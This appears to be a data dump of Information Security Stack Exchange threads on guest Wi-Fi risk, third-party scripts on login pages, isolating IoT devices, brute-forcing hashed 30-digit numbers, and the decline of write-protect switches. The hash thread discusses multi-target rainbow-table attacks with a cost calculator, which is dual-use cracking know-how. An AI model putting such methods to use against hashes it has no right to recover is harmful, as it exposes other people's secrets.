"265749","265749","Wi-Fi with guest network","<p>I use an old AirPort Extreme to provide WiFi in my home. It provides a 2.4 and 5.0 GHz network with a good password, only available to me and my wife. It also provides a separate guest network without password. The benefit is that visitors can have WiFi in my home without needing my password so I don’t need to hand my password out.</p>
<p>Question: Does the ability of a stranger to connect to the guest network put my password protected network at risk? Of course they can cause mayhem on the guest network, but would my main network <em>using the same router</em> be in danger, actual or theoretical?</p>
<p>PS. Thanks for all the answers. My plan was to enable friends and family to use Wifi, but not giving them a password which would be dangerous if one of them is a hacker, more dangerous is one of them is careless and gives the password to a real hacker, and inconvenient because changing the password is a pain if a friend becomes an ex-friend.</p>
<p>Apple has a feature where your phone can send the password to another phone if you allow it, so that phone can connect to your network, but the user cannot find out the password. Small improvement.</p>
<p>So the problems are: Anyone near my home can use my WiFi (I've heard a claim that someone in an apartment block could see 37 networks on their Mac!!!, so you could have 37 people able to log in). Not that big a problem because I can throw them out, but still. And the other problem: Someone who has access to an actual network on my router, meaning my router has to process their network traffic, may have more access to vulnerabilities in the router than someone who just parks their car near my network with nothing opened.</p>
","11","4","265760","<p>I think that besides the technical security risk (which probably is not that critical if the system only works for your visitiors and you trust them), the major problem will be that <em>anybody</em> near your home can use that network.</p>
<p>This means, even if your hard- and software don't have any flaws, the next guy from the street could use your WiFi to perform illegal actions for which you will be held responsible.</p>
<p>And there are people that scan for such freely usable networks, probably even sell that information on a black market. With those kind of &quot;users&quot; the technical side also becomes critical again.</p>
<p>So: set a password for your guest network, and create a QR-Code for that. And change the password regularly (maybe every 3 months?). The QR-Code will make it more convenient for your visitors to log in. (You could use an open network with a gateway page to enter the password, like other WiFis in public places use, but I personally find that a bit of a chore both for the maintainer - you - and the user - your visitors. In the end they don't have to accept any written terms or whatsoever.)</p>
","8"
"265707","265707","Does the SE login page need hardening against third party javascript?","<p>Closely related to the Meta question
<a href=""https://meta.stackexchange.com/questions/383073/can-google-and-cloudflare-find-my-se-password"">Can Google and Cloudflare find my SE password?</a></p>
<p>In short the SE login page loads javascript from Google and
Cloudfare.</p>
<p>I believe the javascript has full access to the DOM and
can trivially find my password.</p>
<ol>
<li>Is it true that Google and Cloudfare can find my SE password?</li>
<li>Is hardening against (1) needed?</li>
</ol>
<p>Please do not tell me &quot;trust them&quot;.</p>
","-2","3","265708","<p>No, it cannot see your password.</p>
<p>When you try to login on SE using Google authentication, two scenarios are possible (oversimplified):</p>
<ol>
<li><strong>You are not logged in on Google:</strong></li>
</ol>
<ul>
<li>SE redirect you to Google</li>
<li>Google shows you the login page and you log in</li>
<li>Google asks with you want to login on SE using its auth</li>
<li>You are redirected to SE with a token enabling you to login with Google</li>
</ul>
<ol start=""2"">
<li><strong>You are already logged in on Google:</strong></li>
</ol>
<ul>
<li>SE redirect you to Google</li>
<li>Google asks with you want to login on SE using its auth</li>
<li>You are redirected to SE with a token enabling you to login with Google</li>
</ul>
<p>So SE will not run Javascript on a Google domain, and you never have to enter your Google password on a SE hosted page.</p>
<p>Not speaking about SE, but about every site that allows you to use Google, Facebook, Twitter and others for authentication: be careful to see if you are really on a Google (or Facebook, Twitter) domain before supplying your password. It's trivial to make a page that looks exact like Google authentication page but it's not. You may end up giving away your passwords.</p>
","-1"
"265707","265707","Does the SE login page need hardening against third party javascript?","<p>Closely related to the Meta question
<a href=""https://meta.stackexchange.com/questions/383073/can-google-and-cloudflare-find-my-se-password"">Can Google and Cloudflare find my SE password?</a></p>
<p>In short the SE login page loads javascript from Google and
Cloudfare.</p>
<p>I believe the javascript has full access to the DOM and
can trivially find my password.</p>
<ol>
<li>Is it true that Google and Cloudfare can find my SE password?</li>
<li>Is hardening against (1) needed?</li>
</ol>
<p>Please do not tell me &quot;trust them&quot;.</p>
","-2","3","265709","<p>Any code can be modified to send data to any unauthorised 3rd party. This is not unique to SE, Google, or Cloudflare. Nor is this a problem with Javascript downloaded from 3rd parties. The problem is never where the script is downloaded from, but where the page <em><strong>sends</strong></em> data. That's what you need to check on.</p>
","0"
"265707","265707","Does the SE login page need hardening against third party javascript?","<p>Closely related to the Meta question
<a href=""https://meta.stackexchange.com/questions/383073/can-google-and-cloudflare-find-my-se-password"">Can Google and Cloudflare find my SE password?</a></p>
<p>In short the SE login page loads javascript from Google and
Cloudfare.</p>
<p>I believe the javascript has full access to the DOM and
can trivially find my password.</p>
<ol>
<li>Is it true that Google and Cloudfare can find my SE password?</li>
<li>Is hardening against (1) needed?</li>
</ol>
<p>Please do not tell me &quot;trust them&quot;.</p>
","-2","3","265710","<blockquote>
<p>I believe the javascript has full access to the DOM and can trivially find my password.</p>
</blockquote>
<p>In general: Javascript included with the script tag directly into the page has full access to the DOM, no matter where this Javascript is included from. But Javascript only included in iframe or so does not, it has only access to the DOM of the specific iframe.</p>
<p>I don't want to do an analysis of the current login page (which might also change in the future so that the answer gets stale). But based on above general statement you should be able to analyze, if the current integration of third parties into the login page is a risk or not.</p>
<blockquote>
<p>SE login page loads javascript from Google and Cloudfare ... Please do not tell me &quot;trust them&quot;.</p>
</blockquote>
<p>I'm not sure which browser you are using, but Google Chrome has the majority of the market share. And the browser has way more access to any site you visit with it than a Javascript loaded from a specific site.</p>
<p>Additionally Stackoverflow seems to use a CDN (currently Fastly, not Cloudflare) which is usually the TLS endpoint too. Such a CDN could inject arbitrary things into any website served by the CDN and could this way also do way more harm than a single included Javascript file.</p>
<p>In other words - you need to trust them, even if not for the specific included Javascript files.</p>
","5"
"265695","265695","Is it possible to restrict individual devices connected to a home router from communicating outside the local network?","<p>I have a device which I don't want to have any communication with the outside world sans any initial updates/etc (say, an IoT device that would otherwise phone home). I would still like to be able to communicate with it from local devices on my home network (e.g. mobile phone / desktop) which do have access to the outside world. Assume that anything that it connects to (e.g. a mobile app on the phone) is already locked down / safe -- I am scoping this question to just the target device itself. What would be the minimum configuration required to do this?</p>
<p>Traditionally most concerns of this nature are out of concern for compromised devices, so higher risk devices might be put on a separate VLAN. My concerns are strictly privacy related, and communication between devices on the same network is desired for convenience.</p>
","1","3","265699","<p>Configure the firewall on the router in a way that it can only connect to private IP addresses and not the public internet. Or use a DNS filter.</p>
","0"
"265695","265695","Is it possible to restrict individual devices connected to a home router from communicating outside the local network?","<p>I have a device which I don't want to have any communication with the outside world sans any initial updates/etc (say, an IoT device that would otherwise phone home). I would still like to be able to communicate with it from local devices on my home network (e.g. mobile phone / desktop) which do have access to the outside world. Assume that anything that it connects to (e.g. a mobile app on the phone) is already locked down / safe -- I am scoping this question to just the target device itself. What would be the minimum configuration required to do this?</p>
<p>Traditionally most concerns of this nature are out of concern for compromised devices, so higher risk devices might be put on a separate VLAN. My concerns are strictly privacy related, and communication between devices on the same network is desired for convenience.</p>
","1","3","265722","<p>Most SOHO routers have controls to do this, sometimes they're buried as <em>parental</em> controls. In every case I've seen, the device MAC address is used to block it from internet access.</p>
","0"
"265695","265695","Is it possible to restrict individual devices connected to a home router from communicating outside the local network?","<p>I have a device which I don't want to have any communication with the outside world sans any initial updates/etc (say, an IoT device that would otherwise phone home). I would still like to be able to communicate with it from local devices on my home network (e.g. mobile phone / desktop) which do have access to the outside world. Assume that anything that it connects to (e.g. a mobile app on the phone) is already locked down / safe -- I am scoping this question to just the target device itself. What would be the minimum configuration required to do this?</p>
<p>Traditionally most concerns of this nature are out of concern for compromised devices, so higher risk devices might be put on a separate VLAN. My concerns are strictly privacy related, and communication between devices on the same network is desired for convenience.</p>
","1","3","266505","<p>After you allow the device to update itself, then you can do the following:</p>
<ul>
<li>assign to it a static <a href=""https://en.wikipedia.org/wiki/Private_network#Private_IPv4_addresses"" rel=""nofollow noreferrer"">private IP</a> so that the network configuration is easier. If the device gets assigned a new local (private) IP every time it connects to the network then the configuration needs to be adjusted, which may be annoying</li>
<li>configure your router firewall to block this IP from connecting to the outside world, but allow it to connect to the rest of the private IPs of the network</li>
</ul>
<p>In case that your home router does not have this capability (firewall), then you could add an intermediate box between your devide and your router that will do the blocking. So the network setup will look something like this:</p>
<pre><code>  -------- printer
 |
 |  -------- laptop
 | |
router
   |
    ---- firewall ---- IoT device
</code></pre>
<p>The intermediate device (firewall) will block any connection attempt made by your device to the internet, but will allow all traffic inside your LAN.</p>
","1"
"265601","265601","Best way to bruteforce a list of hashed integers?","<p>I have a list of hashes, I need to find the original value of any of them.
So far I know that the hashes are only numbers of length 30. The format should be something like 012524012524012524012524012524.</p>
<p>What is the best way to create an algorithm that bruteforce numbers until any hash match? I have thought of a few options but I don't think any of them are optimized:</p>
<ol>
<li>Generate random numbers until one collide.</li>
<li>Iterate numbers from 000000000000000000000000000000 sequentially.</li>
</ol>
","2","3","265602","<p>Assuming that the values are all equally possible, there is no difference between the two options <em>per se</em>.</p>
<p><em>However,</em> there may be a difference in the computation necessary to generate a random number and ensuring it was not tested previously vs. iterating a number stored, so I would go with option #2.</p>
<p>Why do you think #2 would not be optimized? With the initial assumption, <code>00...00</code> has just as much chance to be the right guess than <code>841...936</code>.</p>
<p>Additionally, if you have several hashes to do, I would keep track of the computed hashes and associated numerical values <a href=""https://en.wikipedia.org/wiki/Birthday_attack"" rel=""nofollow noreferrer"">to leverage the Birthday paradox.</a></p>
","2"
"265601","265601","Best way to bruteforce a list of hashed integers?","<p>I have a list of hashes, I need to find the original value of any of them.
So far I know that the hashes are only numbers of length 30. The format should be something like 012524012524012524012524012524.</p>
<p>What is the best way to create an algorithm that bruteforce numbers until any hash match? I have thought of a few options but I don't think any of them are optimized:</p>
<ol>
<li>Generate random numbers until one collide.</li>
<li>Iterate numbers from 000000000000000000000000000000 sequentially.</li>
</ol>
","2","3","265605","<p>Sequential generation will be faster, because it avoids the overhead of generating &quot;random&quot; numbers, and also the inefficiency of trying the same number multiple times.</p>
<p>But I think you also need to reconsider the feasibility of a brute-force attack. 30 numeric digits is about <code>2^100</code>, which is a <em>very</em> big number. Some very rough maths suggests that it would take around 100 years to brute-force that with the computational power of the entire global bitcoin mining network (although you'd expect to crack <em>some</em> of them quicker than that).</p>
<p>Your example only includes digits <code>0-5</code> which would help, but even that is about <code>2^77</code>, which is still a very big number.</p>
","2"
"265601","265601","Best way to bruteforce a list of hashed integers?","<p>I have a list of hashes, I need to find the original value of any of them.
So far I know that the hashes are only numbers of length 30. The format should be something like 012524012524012524012524012524.</p>
<p>What is the best way to create an algorithm that bruteforce numbers until any hash match? I have thought of a few options but I don't think any of them are optimized:</p>
<ol>
<li>Generate random numbers until one collide.</li>
<li>Iterate numbers from 000000000000000000000000000000 sequentially.</li>
</ol>
","2","3","265636","<p>10<sup>30</sup> is approx 2<sup>99.6578428466209</sup>. Therefore a sequential search is not feasible.</p>
<p>Since you asked to find at least one of them, then the usual <strong><a href=""https://crypto.stackexchange.com/q/75880/18298"">multi-target attack</a></strong> is your best option.</p>
<p>Build <a href=""https://doi.org/10.1007%2F978-3-540-45146-4_36"" rel=""nofollow noreferrer"">Oechslin's rainbow tables</a> with <a href=""https://cr.yp.to/papers.html#bruteforce"" rel=""nofollow noreferrer"">parallelized machine</a> version;</p>
<p><strong>The basic calculation;</strong></p>
<p>Let's have <code>t</code> targets and build a p≥t<sup>2</sup> way parallelized machine, the expected cost of recovering the first of <code>t</code> keys is 2<sup>100</sup>/t, the expected time is that of 2<sup>100</sup>/(tp) sequential evaluations of the algorithm. Note that the total expected cost for breaking all of the t keys is still close to 2<sup>100</sup>.</p>
<p><strong>Example</strong></p>
<p>If <code>t</code> is a million target (10<sup>6</sup>) and one can run p=t<sup>2</sup> parallel machines than the cost of finding the first key is ~2<sup>80</sup> and the time is ~2<sup>40</sup> and this is quite achievable.</p>
<p><strong>A sample cost calculator</strong></p>
<p>With the below <a href=""https://sagecell.sagemath.org/?z=eJyFzrEOgyAQBuCdhHe4OIExrTp06-Qj1NmEUIRLKhi490-hapt26Xj3__nuklFRu9uqtIEr9FPXtpyRitZQnrt2unC2KO3Qm5QXW1LXPWczxkRDSKWXPsp5q-z5iIv5ycVuHKrkjLM1oidRjc6ALmSYYUZ_R2-B8u5lASaomkew4n266eXJCym_ACo3KfwFym8H8ARIu1ZM&amp;lang=sage&amp;interacts=eJyLjgUAARUAuQ=="" rel=""nofollow noreferrer"">SageMath code</a>, one can adjust their case.</p>
<pre><code>searchSpace = 2^100
target = 10^6
machines = target**2
firstCost = searchSpace/target
firstTime = searchSpace/(target*machines)

print(&quot;The cost of finding the first is &quot;,log(firstCost,2).n())
print(&quot;The time to finding the first is &quot;,log(firstTime,2).n())

#The cost of finding the first is  80.0684314306758
#The time to finding the first is  40.2052942920275

</code></pre>
<hr />
<blockquote>
<p>Generate random numbers until one collide.</p>
</blockquote>
<p>This is not collision, this is finding pre-images</p>
","2"
"265582","265582","Why did they stop adding physical ""write protect"" mechanism?","<p>Floppy disks used to have a physical means of preventing writing to them. No software could bypass that, no matter what. It had to be flicked physically and manually by a human being.</p>
<p>Modern SD cards and SD card converters have a physical such switch, <strong>but it does not physically prevent anything and only &quot;advises&quot; the software to not write, which it can ignore at will, rendering it completely meaningless and downright deceptive</strong>.</p>
<p>Not a single one of all my many external USB hard disks, even including an older and bigger 3.5&quot; one, have even any such &quot;pretend-switch&quot; on them. Nothing.</p>
<p>Why did they go from allowing physical write protection to not even having a silly &quot;pretend-switch&quot; for this? I've never heard anyone mention this, but to me it's absolutely mindblowing and keeps bothering me every single time I take out my backup media on both disks and memory cards and sticks.</p>
<p>Being able to do this is <strong>crucial</strong> when restoring important backups on potentially malware-infested computers, or when people prone to making honest mistakes are dealing with them and you only want them to be able to fetch/read data but not corrupt/delete it.</p>
<p>It would cost them maybe $0.001 extra per unit to add this. And I haven't even seen it on the really expensive products (except the fake ones on the memory cards mentioned above).</p>
","54","11","265583","<p>Because it is an extra point of failure, and there are much easier-to-use versions at the file system level.</p>
<p>The read/write switch needs a detector on the drive, and due to its mechanical nature, can fail mechanically. It'll definitely cost more than $0.001 per unit.</p>
<p>If you need proper read/write access, you can easily do this at the file system level.</p>
","4"
"265582","265582","Why did they stop adding physical ""write protect"" mechanism?","<p>Floppy disks used to have a physical means of preventing writing to them. No software could bypass that, no matter what. It had to be flicked physically and manually by a human being.</p>
<p>Modern SD cards and SD card converters have a physical such switch, <strong>but it does not physically prevent anything and only &quot;advises&quot; the software to not write, which it can ignore at will, rendering it completely meaningless and downright deceptive</strong>.</p>
<p>Not a single one of all my many external USB hard disks, even including an older and bigger 3.5&quot; one, have even any such &quot;pretend-switch&quot; on them. Nothing.</p>
<p>Why did they go from allowing physical write protection to not even having a silly &quot;pretend-switch&quot; for this? I've never heard anyone mention this, but to me it's absolutely mindblowing and keeps bothering me every single time I take out my backup media on both disks and memory cards and sticks.</p>
<p>Being able to do this is <strong>crucial</strong> when restoring important backups on potentially malware-infested computers, or when people prone to making honest mistakes are dealing with them and you only want them to be able to fetch/read data but not corrupt/delete it.</p>
<p>It would cost them maybe $0.001 extra per unit to add this. And I haven't even seen it on the really expensive products (except the fake ones on the memory cards mentioned above).</p>
","54","11","265585","<p>Ultimately because on USBs, it was a very niche feature that the vast, vast majority of people didn't care about. It adds complexity (and thus cost) to the drives, it's another component that can fail (especially as it's a physical switch on a device with no other moving parts), and it can also cause lots of problems (especially the switch gets accidentally turned on and then the device is &quot;broken&quot;).</p>
<p>There are still companies who sell devices with hardware switches (like <a href=""https://www.kanguru.com/collections/kanguru-usb-drives-with-a-physical-write-protect-switch"" rel=""noreferrer"">Kanguru</a> - and I'm sure you can find others), but you can expect to pay a premium for them. You can also buy hardware write blockers, which are mostly used for forensics, although I've also seen people use them to guarantee that drives can't get infected when moving them between environments.</p>
","15"
"265582","265582","Why did they stop adding physical ""write protect"" mechanism?","<p>Floppy disks used to have a physical means of preventing writing to them. No software could bypass that, no matter what. It had to be flicked physically and manually by a human being.</p>
<p>Modern SD cards and SD card converters have a physical such switch, <strong>but it does not physically prevent anything and only &quot;advises&quot; the software to not write, which it can ignore at will, rendering it completely meaningless and downright deceptive</strong>.</p>
<p>Not a single one of all my many external USB hard disks, even including an older and bigger 3.5&quot; one, have even any such &quot;pretend-switch&quot; on them. Nothing.</p>
<p>Why did they go from allowing physical write protection to not even having a silly &quot;pretend-switch&quot; for this? I've never heard anyone mention this, but to me it's absolutely mindblowing and keeps bothering me every single time I take out my backup media on both disks and memory cards and sticks.</p>
<p>Being able to do this is <strong>crucial</strong> when restoring important backups on potentially malware-infested computers, or when people prone to making honest mistakes are dealing with them and you only want them to be able to fetch/read data but not corrupt/delete it.</p>
<p>It would cost them maybe $0.001 extra per unit to add this. And I haven't even seen it on the really expensive products (except the fake ones on the memory cards mentioned above).</p>
","54","11","265586","<blockquote>
<p>Floppy disks used to have a physical means of preventing writing to them. No software could bypass that, no matter what. It had to be flicked physically and manually by a human being.</p>
</blockquote>
<p>They didn't. It was ultimately controlled by the floppy drive. The plastic tab indicated whatever the floppy was write protected or not, but ultimately a drive could be made that ignored it.</p>
<p>That's <em>no</em> different from SD cards. What's changed is how much is exposed to the host computer: with floppies, the R/W signal could not be overriden by the host using the standard floppy disk interface. With SD card readers, it's simply a bit sent to the software driver for the card reader.</p>
<p>Why doesn't modern media generally provide this?</p>
<p>Well, if read only is a required feature, there's (as <a href=""https://security.stackexchange.com/a/265585/153494"">indicated by other answers</a>) products that offers this. In the not so far past, there was also the extremely common optical media: CD-R and later DVD-R, which housed quite a lot and cost next to nothing, with a write after initial recording being impossible.</p>
<p>So in short: it's not a feature most customers are willing to pay for, so it's not delivered in most mass storage devices. If you need it, get a device with a switch, and pay the premium for it.</p>
","47"
"265582","265582","Why did they stop adding physical ""write protect"" mechanism?","<p>Floppy disks used to have a physical means of preventing writing to them. No software could bypass that, no matter what. It had to be flicked physically and manually by a human being.</p>
<p>Modern SD cards and SD card converters have a physical such switch, <strong>but it does not physically prevent anything and only &quot;advises&quot; the software to not write, which it can ignore at will, rendering it completely meaningless and downright deceptive</strong>.</p>
<p>Not a single one of all my many external USB hard disks, even including an older and bigger 3.5&quot; one, have even any such &quot;pretend-switch&quot; on them. Nothing.</p>
<p>Why did they go from allowing physical write protection to not even having a silly &quot;pretend-switch&quot; for this? I've never heard anyone mention this, but to me it's absolutely mindblowing and keeps bothering me every single time I take out my backup media on both disks and memory cards and sticks.</p>
<p>Being able to do this is <strong>crucial</strong> when restoring important backups on potentially malware-infested computers, or when people prone to making honest mistakes are dealing with them and you only want them to be able to fetch/read data but not corrupt/delete it.</p>
<p>It would cost them maybe $0.001 extra per unit to add this. And I haven't even seen it on the really expensive products (except the fake ones on the memory cards mentioned above).</p>
","54","11","265587","<p>The old floppy disk write protect isn't really at the disk level, and doesn't physically prevent writing.  It instructs the drive to prevent writing, as it's  detected by the drive electronics (on early drives) or firmware (on more modern ones).  Maybe you can trust the electronics even though a user could easily modify them* but you can't necessarily trust the firmware. For an example of floppy drives with modern electronics, I have a USB floppy drive at home.</p>
<p>Except on early drives that were highly analogue by modern standards, the biggest difference in the implementation of write protect on SD vs. floppies is where the code to check/obey the switch is running.  And other flash storage formats don't implement whole-drive write protect at all.  Essentially SD write protect is so a cautious user doesn't accidentally delete their photos - but when it was introduced, pro cameras all used CF cards or the miniature HDDs in CF format anyway.</p>
<p>Also, SD cards support slow read/write over the very simple SPI bus.  Write protect detection for that would have to be done in the card itself, adding cost top every card. For high-speed writing it would have to be implemented in the reader.</p>
<hr />
<p>*<sub>disk duplicators didn't check for the switch, because disks intended for mass distribution didn't always have one, instead having just a hole.  Taping over the hole was a workaround if you wanted to reuse those disks.</sub></p>
","18"
"265582","265582","Why did they stop adding physical ""write protect"" mechanism?","<p>Floppy disks used to have a physical means of preventing writing to them. No software could bypass that, no matter what. It had to be flicked physically and manually by a human being.</p>
<p>Modern SD cards and SD card converters have a physical such switch, <strong>but it does not physically prevent anything and only &quot;advises&quot; the software to not write, which it can ignore at will, rendering it completely meaningless and downright deceptive</strong>.</p>
<p>Not a single one of all my many external USB hard disks, even including an older and bigger 3.5&quot; one, have even any such &quot;pretend-switch&quot; on them. Nothing.</p>
<p>Why did they go from allowing physical write protection to not even having a silly &quot;pretend-switch&quot; for this? I've never heard anyone mention this, but to me it's absolutely mindblowing and keeps bothering me every single time I take out my backup media on both disks and memory cards and sticks.</p>
<p>Being able to do this is <strong>crucial</strong> when restoring important backups on potentially malware-infested computers, or when people prone to making honest mistakes are dealing with them and you only want them to be able to fetch/read data but not corrupt/delete it.</p>
<p>It would cost them maybe $0.001 extra per unit to add this. And I haven't even seen it on the really expensive products (except the fake ones on the memory cards mentioned above).</p>
","54","11","265600","<p>In ancient days when people were WOW'd by how many <strong>kilo</strong>bytes your computer had, the <strong>write</strong> capability could be disabled via a single wire. Modern interfaces and techniques don't lend themselves to that simple of an interface.</p>
<p>There is an entire industry, marketing primarily to forensics use, that make what is commonly referred to as <em><strong>Hardware</strong> Blockers</em>. The idea is this sits between the computer and the storage device to protect (block) any writes from occurring and affecting the evidence, in fact there is a never ending mini-battle as to whether <em><strong>Software</strong> Blocking</em> is acceptable. <em>(Bear with me, there is a point.)</em> The reality of these <strong>expensive</strong> hardware blockers is that none of them are actually hardware blockers, they all work by recognizing and blocking commands known to cause a write. They are software functions in a separate box. In fact their firmware is updatable to account for new devices and protocols and sometimes they still get it wrong.</p>
<p>The net result is that modern implementations are too complex to lend themselves to a simple hardware switch. For <em>example</em>, a given device may require a <em>low</em> power signal to <strong>read</strong> and a <em>high</em> power signal to <strong>write</strong>, what's more <em>timing</em> is lkely different. It's all under software control, there is no dedicated wire to switch.</p>
","10"
"265582","265582","Why did they stop adding physical ""write protect"" mechanism?","<p>Floppy disks used to have a physical means of preventing writing to them. No software could bypass that, no matter what. It had to be flicked physically and manually by a human being.</p>
<p>Modern SD cards and SD card converters have a physical such switch, <strong>but it does not physically prevent anything and only &quot;advises&quot; the software to not write, which it can ignore at will, rendering it completely meaningless and downright deceptive</strong>.</p>
<p>Not a single one of all my many external USB hard disks, even including an older and bigger 3.5&quot; one, have even any such &quot;pretend-switch&quot; on them. Nothing.</p>
<p>Why did they go from allowing physical write protection to not even having a silly &quot;pretend-switch&quot; for this? I've never heard anyone mention this, but to me it's absolutely mindblowing and keeps bothering me every single time I take out my backup media on both disks and memory cards and sticks.</p>
<p>Being able to do this is <strong>crucial</strong> when restoring important backups on potentially malware-infested computers, or when people prone to making honest mistakes are dealing with them and you only want them to be able to fetch/read data but not corrupt/delete it.</p>
<p>It would cost them maybe $0.001 extra per unit to add this. And I haven't even seen it on the really expensive products (except the fake ones on the memory cards mentioned above).</p>
","54","11","265613","<p>Because mass storage write-protect robust enough for security purposes is prohibitively difficult/expensive to implement, and unsecure write-protect for avoiding boneheaded errors is too niche to be worth manufacturing. (After all, a sufficiently advanced bonehead will eventually just toggle the write-protect switch.)</p>
<p>Write (and read) protect is still very common for flash inside SoCs, but this is because the extreme expense of unpackaging an integrated circuit and tampering directly with the wafer excludes most users' threat models. Once you have multiple integrated circuits, the cost of tamper attacks goes down by several orders of magnitude, and you have to do a lot more legwork to protect against hardware MITM. E.g. you may need to have security regions inside each chip to store unique secrets programmed in the factory. Mass storage uses separate flash chips, so you need to upgrade to flash chips with security regions (they don't all have them).</p>
<p>Even if you're only considering software attacks in your threat model (i.e. using storage media in your exclusive custody to re-image a compromised system), circuits outside of security regions (and firmware, inside or outside security regions) receive significantly less R&amp;D to prevent software from accessing parts of the hardware it shouldn't. E.g. a buffer overflow might be found which can be used to write to a section of memory scheduled for DMA transfer to the SPI transmit register as the controller prepares to send an authenticated command to a flash chip. Or a privilege escalation may be found on the controller which lets you load new code into the non-security flash, which can use keys in the security region to send arbitrary commands to flash chips. You'd be hard pressed to find vulnerabilities in the actual security region, but unless the data is literally inside the security region, it's an extremely difficult problem to prevent unauthorized reads and writes to that data. Storage media that can make that claim and back it up would fetch a pretty penny, but would it be worth the R&amp;D? Manufacturers don't seem to think so right now.</p>
","1"
"265582","265582","Why did they stop adding physical ""write protect"" mechanism?","<p>Floppy disks used to have a physical means of preventing writing to them. No software could bypass that, no matter what. It had to be flicked physically and manually by a human being.</p>
<p>Modern SD cards and SD card converters have a physical such switch, <strong>but it does not physically prevent anything and only &quot;advises&quot; the software to not write, which it can ignore at will, rendering it completely meaningless and downright deceptive</strong>.</p>
<p>Not a single one of all my many external USB hard disks, even including an older and bigger 3.5&quot; one, have even any such &quot;pretend-switch&quot; on them. Nothing.</p>
<p>Why did they go from allowing physical write protection to not even having a silly &quot;pretend-switch&quot; for this? I've never heard anyone mention this, but to me it's absolutely mindblowing and keeps bothering me every single time I take out my backup media on both disks and memory cards and sticks.</p>
<p>Being able to do this is <strong>crucial</strong> when restoring important backups on potentially malware-infested computers, or when people prone to making honest mistakes are dealing with them and you only want them to be able to fetch/read data but not corrupt/delete it.</p>
<p>It would cost them maybe $0.001 extra per unit to add this. And I haven't even seen it on the really expensive products (except the fake ones on the memory cards mentioned above).</p>
","54","11","265617","<p>It is many things...</p>
<ul>
<li><p>Even if the cost were $0.001 per SD card, at <a href=""https://www.marketwatch.com/press-release/sd-memory-cards-market-size-and-growth-research-2022-competitive-analysis-by-industry-share-forthcoming-developments-emerging-trends-and-technologies-forecast-to-2028-2022-10-14"" rel=""nofollow noreferrer"">current market</a>, we're talking about a hundreds of thousands (and possibly millions) of dollars extra.</p>
</li>
<li><p>The cost is way more - mechanical parts are surprisingly expensive. Moving parts even more so. For example, you can get complete micro IoT computer like raspberry PI zero W for $5, and a set of a stupid 2x20-pin Strip Dual Male Header for it would cost you extra $0.95 (that 40 little brass pins in plastic) -- which cost 20% of the price of the whole singleboard computer with wifi, bluetooth, CPU, RAM etc. integrated! Moving parts, especially the ones that don't break after several uses, can easily cost more than that whole computer (as would a plastic case for it).</p>
</li>
<li><p>There is not only material cost, oh no. Not the fact the Bill-of-Materials much prefer multiple pieces of the same thing to the different things. Placement cost is absolutely huge. Your chips and components can be placed by pick'n'place machine for basically nothing compared to how much would adding physical switch cost.</p>
</li>
<li><p>then we come to the <strong>real</strong> cost. User support and logistics. There is a moving part. Meaning it will break. The cheaper you managed to make it, the more likely it is it will break. Meaning the more users will complain. Meaning you have to have bigger callcenter, more personnel, more overhead, more outrageous shipping costs on your expense etc. (even if you don't count the cost of the product itself)</p>
</li>
<li><p>there is also upgrade problem with hardware things. If there is a problem found, it is not a simple software fix followed by &quot;put new firmware update and let automatic computer upgrade fetch it and apply it&quot;, it is a recall of defective product which has to be thrown to e-waste (and payed for that) but also a new batches to be delivered at your own cost.</p>
</li>
</ul>
<p>And to compound all that, while putting the switch closer to the actual hardware might seemingly help, it quite often doesn't. It is just that people back then were not so frightened by security exploits (due to Internet not existing and stuff), that <strong>they were easier to convince that something is actually safe when it wasn't</strong>.</p>
<p>Case in point, even on old floppy drive protected by &quot;physical&quot; protection holes, an advanced user (or a software bug) could still write to those supposedly write-protected floppy. For an example, detailed dive in into such a case can be found here in nice retro reverse-engineering blog post: <a href=""https://scarybeastsecurity.blogspot.com/2020/06/a-wild-bug-1970s-intel-8271-disc-chip.html"" rel=""nofollow noreferrer"">https://scarybeastsecurity.blogspot.com/2020/06/a-wild-bug-1970s-intel-8271-disc-chip.html</a></p>
","13"
"265582","265582","Why did they stop adding physical ""write protect"" mechanism?","<p>Floppy disks used to have a physical means of preventing writing to them. No software could bypass that, no matter what. It had to be flicked physically and manually by a human being.</p>
<p>Modern SD cards and SD card converters have a physical such switch, <strong>but it does not physically prevent anything and only &quot;advises&quot; the software to not write, which it can ignore at will, rendering it completely meaningless and downright deceptive</strong>.</p>
<p>Not a single one of all my many external USB hard disks, even including an older and bigger 3.5&quot; one, have even any such &quot;pretend-switch&quot; on them. Nothing.</p>
<p>Why did they go from allowing physical write protection to not even having a silly &quot;pretend-switch&quot; for this? I've never heard anyone mention this, but to me it's absolutely mindblowing and keeps bothering me every single time I take out my backup media on both disks and memory cards and sticks.</p>
<p>Being able to do this is <strong>crucial</strong> when restoring important backups on potentially malware-infested computers, or when people prone to making honest mistakes are dealing with them and you only want them to be able to fetch/read data but not corrupt/delete it.</p>
<p>It would cost them maybe $0.001 extra per unit to add this. And I haven't even seen it on the really expensive products (except the fake ones on the memory cards mentioned above).</p>
","54","11","265634","<p>If it is crucial to you that nothing can write to a disk, there are tools (both hardware and software) that will help you achieve that. It's just that most people don't need this, so it's not worth adding to the regular hardware.</p>
<p>Just google for software write blockers, forensic disk controllers or hardware write-block devices.</p>
","-1"
"265582","265582","Why did they stop adding physical ""write protect"" mechanism?","<p>Floppy disks used to have a physical means of preventing writing to them. No software could bypass that, no matter what. It had to be flicked physically and manually by a human being.</p>
<p>Modern SD cards and SD card converters have a physical such switch, <strong>but it does not physically prevent anything and only &quot;advises&quot; the software to not write, which it can ignore at will, rendering it completely meaningless and downright deceptive</strong>.</p>
<p>Not a single one of all my many external USB hard disks, even including an older and bigger 3.5&quot; one, have even any such &quot;pretend-switch&quot; on them. Nothing.</p>
<p>Why did they go from allowing physical write protection to not even having a silly &quot;pretend-switch&quot; for this? I've never heard anyone mention this, but to me it's absolutely mindblowing and keeps bothering me every single time I take out my backup media on both disks and memory cards and sticks.</p>
<p>Being able to do this is <strong>crucial</strong> when restoring important backups on potentially malware-infested computers, or when people prone to making honest mistakes are dealing with them and you only want them to be able to fetch/read data but not corrupt/delete it.</p>
<p>It would cost them maybe $0.001 extra per unit to add this. And I haven't even seen it on the really expensive products (except the fake ones on the memory cards mentioned above).</p>
","54","11","265640","<p>It may just be my perception, but the &quot;write-protect&quot; mechanisms was more intended as a way to protect valuable (paid) content to be inadvertently erased/overwritten by other data rather than as a nice functionality for end user.</p>
<p>For example, think about your old cassette tapes. You just bought the last album of your preferred artist, they didn't want to sell it on a physical support which could be blown away so easily, so they didn't make it impossible to erase, they just &quot;dumb-proofed&quot; it a bit. It was only to avoid <strong>accidental</strong> erasure.</p>
